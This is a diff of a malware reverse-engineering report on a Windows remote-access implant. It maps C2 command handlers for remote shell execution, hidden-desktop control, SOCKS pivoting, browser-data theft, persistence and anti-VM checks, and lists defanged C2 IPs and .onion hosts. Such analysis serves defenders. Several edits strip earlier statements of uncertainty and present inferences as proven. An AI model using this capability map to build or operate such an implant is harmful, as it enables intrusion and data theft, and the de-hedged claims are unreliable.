 Selector `3` is the file-transfer worker that closes the upload/download gap left by selector `2`. Handler `0x00b1a790` copies the same `0x1c7`-byte command frame style, opens a socket through `0x00b1eb40` using initial-record offsets `+0x20` and `+0x24`, builds a type-`9` `0x1c7`-byte header at `0x00b1a872`-`0x00b1a914`, then loops on responses from `0x00b29240`. Each response body copied at `0x00b1a96c`-`0x00b1a97e` is `0xa68` bytes. Within that nested body, offset `+0x254` is the file-transfer command selector and offset `+0x260` holds a path string capped at `0x401` units.
 
@@ -992,7 +989,7 @@ Selector `4` is a process-control and command-execution worker. Handler `0x00b1e
 | `2` | branch `0x00b1e920`-`0x00b1e983`; helper `0x007a92e0`; `Sleep(1000)`; helper `0x007a94d0` | Terminate process, then refresh process inventory. `0x007a92e0` enables `SeDebugPrivilege`, opens the target PID with terminate access, calls `TerminateProcess(..., 0xffffffff)`, and falls back to helper `0x007acc80` if privilege/token/open/terminate steps fail. |
 | `3` | branch `0x00b1e98e`-`0x00b1ea4e`; extra receive at `0x00b1e998`; helper `0x007a8cd0` | Execute command and return captured output. The worker receives an additional payload, extracts a command string, and passes it to `0x007a8cd0`, which creates a temp output file, launches `cmd.exe /c <command>` with stdout redirected, waits up to `360000` ms, reads the output back into the response stream, deletes the temp file, and sends the captured output. |
 
-This selector overlaps with the earlier high-level process/control evidence but gives it a precise C2 command surface: list processes, kill a process, and run a shell command with output capture.
+This maps the process-control C2 surface to three actions: list processes, kill a process, and run a shell command with output capture.
 
 Selector `5` is an interactive desktop and window-control path. The dispatcher branch at `0x00b1f85d` starts screen-stream worker `0x00b19160`, input/control worker `0x00b185e0`, and conditionally starts window-inventory worker `0x00b176b0`. The branch also calls helper `0x00b1ff30` and uses globals around state offsets `+0x49c` and `+0x4b4`, which appear to coordinate whether the background window enumerator is already active.
 
@@ -1016,11 +1013,11 @@ Input worker `0x00b185e0` opens a second socket through `0x00b1eb40`, sends a ty
 
 Window inventory worker `0x00b176b0` is a background top-level window tracker. It loops while the global stop byte and selector-`5` stop flag remain clear, walks top-level windows with `GetDesktopWindow` and `GetWindow`, filters them through `0x00b08190`, collects parent/owner/style/exstyle/enabled/geometry/PID/title/path metadata through `GetParent`, `GetWindowLongPtrW`, `IsWindowEnabled`, `0x00b08100`, `0x007acd40`, `0x007a86e0`, `0x007ac200`, and `0x00b08200`, and updates global streams/list objects at state offsets `+0x520` and `+0x4f0`. Some branches adjust tracked windows through `SetWindowPos` and related helpers. On exit it clears state `+0x49c` and signals the event around state `+0x490`.
 
-The selector-`5` scope is therefore a full remote-interactive-desktop path: screen capture/streaming, window inventory, target-window tracking, mouse/scroll/key/window-close actions, clipboard copy/paste transfer, received command/program launch, session teardown, state refresh, and process/PID fallback termination. The exact field names inside the 0x20-byte input command block remain open, but the command behavior is now mapped at a usable level.
+Selector `5` is a full remote-interactive-desktop path: screen capture and streaming, window inventory, target-window tracking, mouse, scroll, key, and window-close actions, clipboard copy/paste transfer, command/program launch, session teardown, state refresh, and process/PID fallback termination.
 
 Selector `0x0b` is a second remote-interactive-desktop implementation. The dispatcher branch starts screen worker `0x00b1a340` and input worker `0x00b19770` with the same copied `0xa7`-byte context record. Each worker opens its own socket through `0x00b1eb40` using the context endpoint fields, builds a `0x1c7`-byte session header, and sends it through `0x00b28fc0`. The dispatcher copies an additional command dword into local state before starting the input worker, applies the requested thread priority, and waits up to `0x1388` ms on each launch event.
 
-Screen worker `0x00b1a340` initializes dimensions from the command context, sends its display-oriented session header, and repeatedly prepares a screen buffer while the stop state remains clear. A dimension-change test selects between a delta/update helper and a full-buffer reset. The resulting status value selects either transform `0x007a1840` or codec helper `0x0079c3f0` with static material at `0x00b1a784`. Each cycle sends the four-byte status followed by the encoded screen stream through `0x00b27ca0`, then receives a 0x18-byte peer control block. The exact names of the control fields and codec modes remain unresolved, but the buffer lifecycle, dimension reset, status exchange, and outbound screen-stream role are statically clear.
+Screen worker `0x00b1a340` initializes dimensions from the command context, sends its display-oriented session header, and repeatedly prepares a screen buffer while the stop state remains clear. A dimension-change test selects between a delta/update helper and a full-buffer reset. The resulting status selects transform `0x007a1840` or codec helper `0x0079c3f0` with static material at `0x00b1a784`. Each cycle sends the four-byte status followed by the encoded screen stream through `0x00b27ca0`, then receives a 0x18-byte peer control block.
 
 Input worker `0x00b19770` sends a separate input-oriented session header, then receives 0x2e-byte control blocks through `0x00b27760`. Its command byte selects the following behavior:
 
@@ -1033,15 +1030,15 @@ Input worker `0x00b19770` sends a separate input-oriented session header, then r
 | `5`, direction `0` | receives a variable payload; `SetClipboardData(CF_UNICODETEXT=0x0d)`; `SendMessageA(WM_PASTE=0x302)` | Receives Unicode text, places it in the system clipboard, and pastes it into the foreground window. |
 | `5`, direction `1` | `SendMessageA(WM_COPY=0x301)`; `GetClipboardData(0x0d)`; `GlobalSize` / `GlobalLock`; `0x00b28fc0` | Copies the foreground selection, reads Unicode clipboard data, and sends it to the peer. |
 
-This branch differs materially from selector `5`: selector `5` targets tracked windows with `PostMessageW`, maintains window inventory, and can launch commands, while selector `0x0b` injects global input through the legacy system input APIs and uses foreground-window copy/paste messages. The exact field names in its 0x18-byte screen acknowledgement and 0x2e-byte input record remain open; the operator behavior is mapped.
+Selector `5` targets tracked windows with `PostMessageW`, maintains window inventory, and launches commands. Selector `0x0b` injects global input through legacy system input APIs and uses foreground-window copy/paste messages. The field names in the acknowledgement and input records remain unidentified.
 
-Selector `6` is now verified as a bridge/pivot path rather than only a socket candidate. Handler `0x00b1ed60` copies the full `0x1c7` command record, then reads an IPv4/port pair from offsets `+0x20` and `+0x24`. If the port field at `+0x24` is not `-1`, it opens that target socket with `0x00b2a380`. It then opens a second socket through `0x00b1eb40` using record offsets `+0x2c` and `+0x30`, builds a type-`6` `0x1c7`-byte header, copies two `0x20`-byte identifiers from record offsets `+0x5c` and `+0x7d`, and sends the header through `0x00b28fc0`. On success, `0x00b27db0` sets both sockets nonblocking with `WSAIoctl(0x98000004)`, loops on `select`, and forwards data both ways with `recv` and `send` using a `0x20001`-byte buffer.
+Selector `6` implements a bridge/pivot path. Handler `0x00b1ed60` copies the full `0x1c7` command record, then reads an IPv4/port pair from offsets `+0x20` and `+0x24`. A port value other than `-1` opens the target socket with `0x00b2a380`. The handler opens a second socket through `0x00b1eb40` using record offsets `+0x2c` and `+0x30`, builds a type-`6` `0x1c7`-byte header, copies two `0x20`-byte identifiers from record offsets `+0x5c` and `+0x7d`, and sends the header through `0x00b28fc0`. On success, `0x00b27db0` sets both sockets nonblocking with `WSAIoctl(0x98000004)`, loops on `select`, and forwards data both ways with `recv` and `send` using a `0x20001`-byte buffer.
 
-If selector `6` sees the target port field `+0x24` set to `-1`, it skips the fixed target socket and calls `0x00b28d50` on the auxiliary socket. The observed call passes auth mode `0`. In that mode, `0x00b28700` peeks the first byte and handles SOCKS4 or SOCKS5 no-auth negotiation. The SOCKS4 branch replies with status `0x5a` after a target `connect`; the SOCKS5 branch sends `05 00`, and `0x00b28110` then parses SOCKS5 CONNECT requests for IPv4 or domain targets, resolving domains with `gethostbyname`. A username/password SOCKS5 helper exists at `0x00b28a30`, but selector `6` does not pass the auth-mode value that reaches it in the recovered call path.
+When selector `6` sees port field `+0x24` set to `-1`, it calls `0x00b28d50` on the auxiliary socket with auth mode `0`. Function `0x00b28700` then handles SOCKS4 or SOCKS5 no-auth negotiation. The SOCKS4 branch replies with status `0x5a` after a target `connect`; the SOCKS5 branch sends `05 00`, and `0x00b28110` parses CONNECT requests for IPv4 or domain targets, resolving domains with `gethostbyname`. A username/password helper also exists at `0x00b28a30`.
 
-Selector `0x34` is a commanded browser-data collection report with a system-profile attachment. The dispatcher copies command offsets `0x1c` and `0x20` into the local context record, reaches branch `0x00b1fcce`, and starts worker `0x00b1dd80` at `0x00b1fd14`-`0x00b1fd36`. The thread parameter is the `0xa7`-byte context record, not the decoded command frame itself.
+Selector `0x34` is a commanded browser-data collection report with a system-profile attachment. The dispatcher copies command offsets `0x1c` and `0x20` into a `0xa7`-byte context record, reaches branch `0x00b1fcce`, and starts worker `0x00b1dd80` at `0x00b1fd14`-`0x00b1fd36` with that context.
 
-The `0x00b1dd80` worker copies all `0xa7` context bytes, but the confirmed consumed fields are:
+The `0x00b1dd80` worker copies all `0xa7` context bytes and consumes these fields:
 
 | Context offset | Use |
 |---:|---|
@@ -1061,7 +1058,7 @@ The report body is built as tagged records under field-set ID `0x81`. Each colle
 
 Socket setup is through `0x00b1eb40`, which calls `0x00b2a380` for AF_INET/TCP, uses `WSAIoctl(0x98000004)` keepalive settings, calls `0x007a0c50` to generate CryptoAPI key material, and sends a mode-`2` public-key/session preface through `0x00b28fc0`. After that preface, selector `0x34` sends up to two direct report frames: the fixed `0x1c7`-byte context report at `0x00b1e442`, and, only if that succeeds, the serialized tagged report body at `0x00b1e48c`. The send wrapper `0x00b28fc0` applies the mode-`2` codec (`0x0079c3f0`), adds random padding, protects the frame with hybrid CryptoAPI encryption through `0x007a12f0`, and transmits with `0x00b27520`, which chunks payloads up to `0x20000` bytes.
 
-No receive or acknowledgement handling was found inside `0x00b1dd80` after the report sends; it closes the socket at `0x00b1e493`-`0x00b1e49a`. The parent dispatcher receives the command before launching the worker, but this worker itself is send-only. Static confidence is high that this path targets sensitive browser stores and endpoint inventory. Exact database columns and successful decryption of browser-protected data remain host-dependent and were not proven without execution.
+After sending the report, `0x00b1dd80` closes the socket at `0x00b1e493`-`0x00b1e49a`. This worker is send-only. It targets sensitive browser stores and endpoint inventory; database columns and decryption results depend on the browser and host.
 
 The connection task record now has a partial layout:
 
@@ -1075,9 +1072,9 @@ The connection task record now has a partial layout:
 
 Direct helper `0x00b2a380(ip, port)` creates an IPv4 TCP socket, formats the 32-bit IP byte-by-byte through `0x007abfe0`, passes the result to `inet_addr`, calls `connect`, and handles nonblocking `WSAEWOULDBLOCK` (`0x2733`) with a `select` loop that sleeps once per second for up to 15 iterations. On success it sets a socket option through `WSAIoctl(0x98000004, {1, 30000, 10000})` and then calls `0x00b29c60`.
 
-SOCKS helper `0x00b29f10(host, port)` creates a TCP socket to local `127.0.0.1:<state+0x1388>`, where `state+0x1388` is the same decimal-5000 field that fallback worker `0x00b29780` populates with default `0x235a` when unset. It sends the SOCKS5 greeting bytes `05 01 00`, expects a `05 00` no-auth response, builds a SOCKS5 CONNECT request using prefix `05 01 00 03`, one-byte domain length, the domain bytes, and a two-byte network-order port, sends that request, and keeps the socket only if a response is received. Static evidence therefore supports two endpoint modes: direct IPv4 task records and domain-over-local-SOCKS task records, with the latter likely riding the loaded `tor_main` path.
+SOCKS helper `0x00b29f10(host, port)` creates a TCP socket to local `127[.]0[.]0[.]1:<state+0x1388>`, where `state+0x1388` is the same decimal-5000 field that fallback worker `0x00b29780` populates with default `0x235a` when unset. It sends the SOCKS5 greeting bytes `05 01 00`, expects a `05 00` no-auth response, builds a SOCKS5 CONNECT request using prefix `05 01 00 03`, one-byte domain length, the domain bytes, and a two-byte network-order port, sends that request, and keeps the socket only if a response is received. The code implements direct IPv4 and domain-over-local-SOCKS endpoint modes, with the SOCKS path using the loaded `tor_main` module.
 
-Helper `0x007abfe0` confirms the byte order for these IPv4 constants: it loops over the four in-memory bytes of its integer input, appends each decimal octet with a dot separator, and removes the final separator. In the SOCKS helper, `0x0100007f` is therefore rendered as `127.0.0.1` before `inet_addr`.
+Helper `0x007abfe0` confirms the byte order for these IPv4 constants: it loops over the four in-memory bytes of its integer input, appends each decimal octet with a dot separator, and removes the final separator. In the SOCKS helper, `0x0100007f` is therefore rendered as `127[.]0[.]0[.]1` before `inet_addr`.
 
 Related worker `0x00b2ecb0` reuses the cached successful task record at global `+0x5a4`. If the cached mode byte at `+0x5a4` is zero, it calls direct helper `0x00b2a380(*(state+0x5a5), *(state+0x5a9))`; otherwise it copies a `0x108`-byte host block from `state+0x5ad` and calls SOCKS helper `0x00b29f10(host, *(state+0x6b5))`. This reinforces that `state+0x5a4` is the cached connection record written by scheduler `0x00b2dd00` after a successful worker run.
 
@@ -1087,10 +1084,10 @@ Scheduler category `2` calls generator `0x0054f950` once, then reads four genera
 
 | Generator constant | Endpoint after subtractor |
 |---|---|
-| `0x774a9770 - 0x43`, `0x1fe - 0x43` | `45.151.74.119:443` |
-| `0xb85facb0 - 0x43`, `0x1fe - 0x43` | `109.172.95.184:443` |
-| `0x8704ecda - 0x43`, `0x1fe - 0x43` | `151.236.4.135:443` |
-| `0x0b9c3c81 - 0x43`, `0x1fe - 0x43` | `62.60.156.11:443` |
+| `0x774a9770 - 0x43`, `0x1fe - 0x43` | `45[.]151[.]74[.]119:443` |
+| `0xb85facb0 - 0x43`, `0x1fe - 0x43` | `109[.]172[.]95[.]184:443` |
+| `0x8704ecda - 0x43`, `0x1fe - 0x43` | `151[.]236[.]4[.]135:443` |
+| `0x0b9c3c81 - 0x43`, `0x1fe - 0x43` | `62[.]60[.]156[.]11:443` |
 
 Fallback helper `0x0054fa00`, called by `0x00b29780` before the `tor_main` path, seeds four `.onion` host strings and uses the same `0x1fe - 0x43 = 443` port derivation:
 
@@ -1103,7 +1100,7 @@ fejdqikkdwheckrutucbbyeovpdnef4bopz2fx636i67p3qpffpfxxad[.]onion:443
 
 The scheduler therefore has three endpoint-candidate families. Category `0` is a four-slot direct `(IPv4, port)` table at state `+0x92d`, updated from the C2 response to request `0x800 / 1`. Category `1` is domain-over-local-SOCKS/Tor to four `.onion` hosts over port 443; those host buffers are zero in the carved static image until `0x0054fa00` seeds them after the Tor module maps. Category `2` is the generated four-entry direct IPv4/TCP-443 fallback set. A successful record from any category is cached at state `+0x5a4` for first-choice reuse.
 
-There is also a separate simple endpoint-global path used by selector `0x33`'s hidden-desktop subsystem. Globals `0x00c104a8` and `0x00c104ac` are written by `0x00b15cd0`, not initialized as literals. Their complete static provenance is:
+Selector `0x33` uses a separate endpoint-global path for its hidden-desktop subsystem. Function `0x00b15cd0` writes globals `0x00c104a8` and `0x00c104ac` from C2-supplied data:
 
 ```text
 0x00b2bd00, response to request 0x800 / 6
@@ -1137,11 +1134,11 @@ There is also a separate simple endpoint-global path used by selector `0x33`'s h
   connect(...)
 ```
 
-The endpoint is therefore directly C2-selected, but not carried by the later selector-`0x33` frame. It arrives earlier in the `0x800 / 6` record that creates the command dispatcher. Within `0x00b1f010`, the fixed command frame is copied separately from the retained `0xa7` context. The `0x33` branch changes context offset `+0x7b` to the command frame's priority value, then passes the retained context to `0x00b1db20`; it does not overwrite context endpoint offsets `+0x63/+0x67`.
+The C2 selects this endpoint in the earlier `0x800 / 6` record that creates the command dispatcher. Within `0x00b1f010`, the fixed command frame and `0xa7` context are copied separately. The `0x33` branch writes the command priority to context offset `+0x7b` and passes the context, including endpoint offsets `+0x63/+0x67`, to `0x00b1db20`.
 
 Worker `0x00b1db20` can retry the same endpoint up to 16 times. It converts context `+0x63` to dotted IPv4, passes context `+0x67` as the port, and calls `0x00b15cd0`. That function writes the globals, records the current PID and OS version, resolves DPI helpers, and starts `0x00b15770`. The latter opens or creates the named desktop supplied in the context, applies low-integrity SACL `S:(ML;;NW;;;LW)`, switches the thread to that desktop, and starts controller `0x00b13f40`.
 
-Controller `0x00b13f40` connects through `0x00b0b2f0 -> 0x00b0b220` using the simple endpoint globals, identifies the channel with value `0x33`, starts display/output worker `0x00b0b5c0`, and processes a dedicated remote-UI protocol. Static branches inject mouse and keyboard/window messages, move/resize/close windows, send typed text, switch between the original and private desktops, and return window/display information. Higher commands can launch `explorer.exe` on the private desktop, invoke `rundll32.exe shell32.dll,#61`, temporarily adjust `TaskbarGlomLevel`, and terminate the session. Exact names for every protocol value from `0x400` through `0x41e` remain open, but the hidden-desktop role and endpoint lineage are proven.
+Controller `0x00b13f40` connects through `0x00b0b2f0 -> 0x00b0b220` using the endpoint globals, identifies the channel with value `0x33`, starts display/output worker `0x00b0b5c0`, and processes a dedicated remote-UI protocol. Its branches inject mouse and keyboard/window messages, move, resize, and close windows, send typed text, switch between the original and private desktops, and return window/display information. Higher commands launch `explorer.exe` on the private desktop, invoke `rundll32.exe shell32.dll,#61`, temporarily adjust `TaskbarGlomLevel`, and terminate the session.
 
 The controller sets selector `0x33` at `0x00b13ff0`, calls the selector routine at `0x00b13ff7`, calls `SetThreadDesktop` at `0x00b14004`, and loads each protocol word at `0x00b141be`. Setup `0x00b15770` preserves the original desktop handle in `0x00c105b8` and the alternate desktop handle in `0x00c105c0`. The recovered protocol map is:
 
@@ -1179,13 +1176,13 @@ The controller sets selector `0x33` at `0x00b13ff0`, calls the selector routine 
 | `0x41d` | `0x00b142ea -> 0x00b1481b` | Receives length-prefixed JSON containing `cmd` and `style`, then dispatches a browser launch or fallback action through `0x00b12660` / `0x00b0b9c0`. | High; accepted command vocabulary remains unnamed. |
 | `0x41e` | `0x00b142fd -> 0x00b147cf` | Sets termination state, returns four-byte value `1`, terminates the worker at `0x00b15459`, and closes the session through `0x00b15f80`. | High; two termination-state fields remain unnamed. |
 
-The strongest private-desktop controls are `0x408`, `0x409`, `0x40c`, `0x40e`, `0x410`, and `0x41e`. Values with only state writes or generic buffer handling remain deliberately behavior-named rather than assigned speculative operator labels.
+The core private-desktop controls are `0x408`, `0x409`, `0x40c`, `0x40e`, `0x410`, and `0x41e`. State-only and generic-buffer values are labeled by their observed behavior.
 
-Several C2 object types under `0x00b2aaf0` retain behavior-level rather than operator-facing names. That naming limit does not affect the capability assessment: static evidence establishes surveillance and browser-store collection, TCP transport, persistence, remote-process manipulation, multiple remote-desktop implementations, and dynamic endpoint selection. It also shows how the direct scheduler table, Tor module/`.onion` records, generated fallbacks, and hidden-desktop endpoint are selected or refreshed.
+The C2 object types under `0x00b2aaf0` are labeled by behavior. They cover surveillance and browser-store collection, TCP transport, persistence, remote-process manipulation, multiple remote-desktop implementations, and dynamic endpoint selection. The same code shows how the direct scheduler table, Tor module and `.onion` records, generated fallbacks, and hidden-desktop endpoint are selected or refreshed.
 
 ### API resolver and wrappers
 
-The following `0x100...` notes belong to the earlier `Stream.Toolkit.dat` decoded shellcode, not to the final PE at image base `0x400000`.
+The following `0x100...` addresses describe the earlier `Stream.Toolkit.dat` shellcode. The final PE uses image base `0x400000`.
 
 The decoded payload resolves imports manually.
 
@@ -1270,11 +1267,11 @@ gdi32.dll/iphlpapi.dll: CreateFontW, SelectObject, DeleteObject,
 bcrypt.dll: BCryptGenRandom
 ```
 
-The resolver table contains `winhttp.dll` and `ws2_32.dll` module hashes, but this extraction did not find wrapper call sites that resolve WinHTTP or Winsock API names in the decoded `Stream.Toolkit` payload. The observed network delivery remains upstream in the JavaScript/PowerShell chain.
+The resolver table contains `winhttp.dll` and `ws2_32.dll` module hashes. Network delivery for this stage occurs upstream in the JavaScript and PowerShell chain.
 
-### Behavior proof points in the decoded payload
+### Decoded payload behavior
 
-The storage runner now has an end-to-end static path into the dispatcher:
+The storage runner reaches the dispatcher through this path:
 
 ```text
 0x10052841 entry path
@@ -1288,7 +1285,7 @@ The storage runner now has an end-to-end static path into the dispatcher:
   -> 0x1000c6e5 resolves the entry group and calls 0x1000cc05
 ```
 
-`0x10051f85` registers the same top-level group IDs routed by the master dispatcher: `300`, `400`, `500`, `600`, `700`, `1000`, `0x44c`, `0x4b0`, `0x514`, `0x5dc`, `0x6a4`, `0x708`, `0x76c`, `0x7d0`, `0x834`, and `0x898`. This makes the dispatcher table part of the parsed-storage execution model rather than a detached helper table.
+`0x10051f85` registers the same top-level group IDs routed by the master dispatcher: `300`, `400`, `500`, `600`, `700`, `1000`, `0x44c`, `0x4b0`, `0x514`, `0x5dc`, `0x6a4`, `0x708`, `0x76c`, `0x7d0`, `0x834`, and `0x898`. The dispatcher table is part of the parsed-storage execution model.
 
 The key bridge is `0x1000c6e5`. It looks up a group object using the parsed entry's group value, stores a next/continuation value from `entry+0x28`, and then calls:
 
@@ -1298,7 +1295,7 @@ The key bridge is `0x1000c6e5`. It looks up a group object using the parsed entr
 
 After the dispatcher returns, `0x10051e51` either invokes the returned object through `0x10007c19` or, when the parsed entry has a non-null `entry+0x20` and `entry+0x10` is not `0x5e1` or `0x5e2`, through `0x10007b21`. It then uses `0x1000c9cd` to find the next entry whose first qword matches the stored continuation value. If no match is found, `0x1000c9cd` returns `0xffffffffffffffff` and the loop stops.
 
-The decoded shellcode is command-driven. The top-level dispatcher at `0x1000cc05` reads the value stored at `object+8` through `0x10006159`, then routes that value to grouped handlers. Static routing observed so far:
+The decoded shellcode is command-driven. The top-level dispatcher at `0x1000cc05` reads the value stored at `object+8` through `0x10006159`, then routes that value to grouped handlers. Static routing:
 
 ```text
 300    -> 0x10006ef9
@@ -1319,7 +1316,7 @@ The decoded shellcode is command-driven. The top-level dispatcher at `0x1000cc05
 0x898  -> 0x1001dd25
 ```
 
-`0x100010ed` is the handler for command IDs `0x709` through `0x717`. Persistence, service installation, and several file/registry/service helper paths are exposed through this group rather than executed unconditionally at shellcode entry.
+`0x100010ed` handles command IDs `0x709` through `0x717`, which expose persistence, service installation, and file, registry, and service helpers on demand.
 
 Other top-level groups are being reduced in the same way. Current static map:
 
@@ -1329,12 +1326,12 @@ Other top-level groups are being reduced in the same way. Current static map:
 | `400` | `0x1000ac6d` | `0x191`-`0x193` | UI group. It resolves `MessageBoxW` through `0x10043e55`, and contains two window/display helpers. `0x1000a499` decodes `Progman`, `Shell_TrayWnd`, and `Static`, resolves user32 calls such as `FindWindowW`, `GetDesktopWindow`, `GetSystemMetrics`, `CreateWindowExW`, `SetLayeredWindowAttributes`, `UpdateWindow`, `DestroyWindow`, and `Sleep`, and appears to create or animate a desktop/taskbar-covering overlay. `0x1000a1f5` creates a smaller `Static`-class window path. |
 | `500` | `0x1002ea79` | `0x1f5`-`0x1f9` | Host/profile collection group. Wrappers resolve `GetSystemInfo`, `GlobalMemoryStatusEx`, `GetComputerNameW`, `GetUserNameW`, `GetUserDefaultLocaleName`, and `GetLocaleInfoEx`, then return numbers or bounded strings through the internal result-object helpers. |
 | `600` | `0x1002259d` | `0x259`-`0x26d` | Module/runtime control group. `0x259`, `0x26c`, and `0x26d` return current-module path variants through `GetModuleFileNameW`: full path, directory component, and filename component. `0x25a`/`0x25b` use a Toolhelp module snapshot path to locate a loaded module by name. `0x25c` calls `LoadLibraryW` and returns the handle; `0x25d` resolves a handle from the internal loader list and calls `FreeLibrary`; `0x25e`/`0x25f` test internal module-list state. `0x260`/`0x261` call `GetCurrentProcess` and `NtUnmapViewOfSection` against a named or numeric module address. `0x265`/`0x266` add and remove vectored exception handlers; `0x26b` calls `ExitProcess(0)`. Remaining cases are PE/module inspection and path-matching helpers, including checks around a module `.data` section and loaded-module path iteration. |
-| `700` | `0x1000d48d` | `0x2bd`-`0x2cf` | Path/container helper group. It is mostly internal string/list/object work, but helper `0x1003f5e9` resolves `GetFileAttributesW` and tests attribute bit `0x10` for directory checks, while helper `0x1003f58d` resolves `DeleteFileW`. Other cases compare, transform, aggregate, and iterate internal containers through helpers around `0x1003f...`, `0x100405...`, `0x100409...`, and `0x1000ec...`. |
+| `700` | `0x1000d48d` | `0x2bd`-`0x2cf` | Path/container helper group. Helper `0x1003f5e9` resolves `GetFileAttributesW` and tests attribute bit `0x10` for directory checks; helper `0x1003f58d` resolves `DeleteFileW`. Other cases compare, transform, aggregate, and iterate internal containers through helpers around `0x1003f...`, `0x100405...`, `0x100409...`, and `0x1000ec...`. |
 | `1000` | `0x100252dd` | `0x3e9`-`0x3f0` | Async task/callback object group. It allocates an `0x50`-byte object, stores context pointers at offsets such as `0x18` and `0x48`, inserts/removes callback records, can launch a worker thread through the `CreateThread` wrapper at `0x100448a5`, signals through `SetEvent` wrapper `0x10044c11`, and uses ntdll SRW-lock wrappers (`RtlAcquireSRWLockShared`, `RtlReleaseSRWLockShared`, `RtlAcquireSRWLockExclusive`, `RtlReleaseSRWLockExclusive`) around internal lists. |
 | `0x44c` | `0x10000191` | `0x44d`-`0x45a`, `0x460`, `0x461` | Anti-analysis and environmental probe group. The early cases create a probe context through `0x10030e69`/`0x10030edd`, then call VM classifiers such as `0x10030f9d`, `0x10031365`, and `0x1003184d`; those paths use CPUID hypervisor vendor strings and `HKLM\SYSTEM\CurrentControlSet\Services` enumeration to classify VMware, VirtualBox, Hyper-V, QEMU, Xen, and Parallels markers into numeric classes at `object+0x14`. Later cases build a timed probe context with `CreateEventW`, `WaitForSingleObject`, and `GetTickCount64`/`GetTickCount`. Screen-layout probes call `GetSystemMetrics`; foreground-window churn is measured with `GetForegroundWindow` in `0x10033a85`; network activity is measured through two `GetIpStatistics` snapshots in `0x10033b69`, which compares traffic deltas over a timed window. |
 | `0x4b0` | `0x1002e001` | `0x4b1`-`0x4b5` | Worker/callback object lifecycle group. `0x4b1` allocates an `0x50`-byte object via `0x10023f85`, initializes it in `0x1002cf45`, creates event handles with `CreateEventW`, binds the parent context at object offset `0x38`, and registers the object under the `0x4b0` group. `0x4b2` looks up the object, associates callback masks `1`, `2`, `4`, `8`, `0x10`, `0x20`, `0x40`, and `0x80`, then starts a worker through `CreateThread` in `0x1002d1ed` and waits up to `5000` ms through `WaitForSingleObject` for readiness. `0x4b3` signals stop through `SetEvent`; `0x4b4` returns whether the object has an active worker pointer; `0x4b5` stops, unregisters, closes handles, frees the runtime context, and returns success/failure. |
 | `0x514` | `0x10006241` | `0x515`-`0x51a` | Internal typed-value/result adapter group. `0x515` validates or opens the backing object through `0x10039c15`; `0x516` clears object state through `0x10039b45`; `0x517` iterates every argument in the supplied container and appends typed values into a collection before committing it with `0x1003a1dd`. Numeric values are appended through `0x1004e849`/`0x1004f5c9`; booleans can be rendered through decoded UTF-16 strings `true` and `false`; object-backed values are read under SRW-lock wrappers (`0x100450b1`/`0x10045129`) when needed. `0x518` exports the current collection through `0x10039f05`; `0x519` validates collection state through `0x1003a2f5`; `0x51a` looks up an object and tests or attaches it through `0x10039e7d`. |
-| `0x5dc` | `0x100274fd` | `0x5dd`-`0x616` | Core interpreter primitive group. This switch mostly operates on parsed command/runtime state rather than Windows APIs. `0x5dd` ensures a group/runtime object exists through `0x10025f95`; `0x5de` frees/removes a group object and drains queued entries; `0x5df` increments a group counter; `0x5e0` removes queued entries matching the current counter. `0x5e1`/`0x5e2` are special control-flow cases: `0x5e1` looks up an entry through an internal continuation list, while `0x5e2` searches records by the current group generation and returns the matching continuation/object pointer. Cases `0x5e7`-`0x5ef` handle equality/ordering-style tests across integer, object, string, and boolean representations. Later cases implement integer arithmetic, bitwise/not, list and string helpers, formatting/conversion helpers, and typed result export. The runner treats `0x5e1`/`0x5e2` differently after dispatcher return, which lines up with those being jump/continuation primitives. |
+| `0x5dc` | `0x100274fd` | `0x5dd`-`0x616` | Core interpreter primitive group for parsed command and runtime state. `0x5dd` ensures a group/runtime object exists through `0x10025f95`; `0x5de` frees/removes a group object and drains queued entries; `0x5df` increments a group counter; `0x5e0` removes queued entries matching the current counter. `0x5e1` looks up an entry through an internal continuation list, while `0x5e2` searches records by the current group generation and returns the matching continuation/object pointer. Cases `0x5e7`-`0x5ef` handle equality and ordering tests across integer, object, string, and boolean representations. Later cases implement integer arithmetic, bitwise operations, list and string helpers, formatting/conversion helpers, and typed result export. The runner handles `0x5e1` and `0x5e2` as jump/continuation primitives after dispatcher return. |
 | `0x6a4` | `0x10013b71` | `0x6a5`-`0x6c7` | Windows known-folder/environment path catalog. Each case appends one resolved path into an internal string collection and returns it. Most helpers call `SHGetKnownFolderPath` through `0x1003ba71` with embedded known-folder GUIDs; `0x1003d4ad` uses `GetTempPathW`. This gives the parsed command stream indirect access to profile, shell, and temporary paths without storing those paths as plaintext in the storage file. |
 | `0x708` | `0x100010ed` | `0x709`-`0x717` | Persistence lifecycle group. This switch exposes HKCU/HKLM Run writes/deletes/checks, Startup-folder `.lnk` create/delete/check helpers, Windows service create/delete/check helpers, and Task Scheduler create/delete/check helpers. The detailed persistence evidence follows this table. |
 | `0x76c` | `0x1002fde9` | `0x76d`-`0x777` | Timer-queue object lifecycle group. `0x76d` allocates and registers a `0x38`-byte object, initializes a timer queue through `CreateTimerQueue`, and sets up an SRW-locked record list. `0x76e` adds a timer record and calls `CreateTimerQueueTimer`; `0x76f` removes records by key; `0x770`-`0x772` change/suspend/resume timer records through `ChangeTimerQueueTimer`; `0x773` checks record state; `0x774` returns a count/value from the object; `0x775`/`0x776` stop or drain timer records; `0x777` unregisters the object and frees it. Confirmed wrappers include `CreateTimerQueue`, `CreateTimerQueueTimer`, `DeleteTimerQueueTimer`, and `ChangeTimerQueueTimer`, with SRW-lock wrappers around the internal record list. |
@@ -1392,13 +1389,13 @@ Microsoft Hv
  prl hyperv 
 ```
 
-Ghidra's anti-analysis scan also flagged an `RDTSC` instruction in `0x1004af51`; static review shows that helper returns a value in a caller-supplied integer range and is used by string/container helpers. Current interpretation: the CPUID path is anti-VM logic; the RDTSC helper is not yet evidence of timing anti-analysis.
+Ghidra's anti-analysis scan also flagged an `RDTSC` instruction in `0x1004af51`. That helper returns a value in a caller-supplied integer range and is used by string/container helpers. The CPUID path implements anti-VM logic; `0x1004af51` acts as a range-value helper.
 
 The `0x898` dispatcher group at `0x1001dd25` covers command IDs `0x899` through `0x8af`. This group includes native in-memory loader variants and hosted CLR loader variants. r2 identifies this as a large switch function, about 7.6 KB with 51 basic blocks and 1,259 instructions. The native loader helpers use `VirtualAlloc` (`0x10047429`), `VirtualProtect` (`0x100474b9`), and `CreateThread` (`0x100448a5`). Several helpers parse PE-like headers and section tables: they read fields such as `e_lfanew` at `+0x3c`, walk section entries with a `0x28` stride, copy headers/sections into allocated memory, adjust section protections, and then optionally start execution.
 
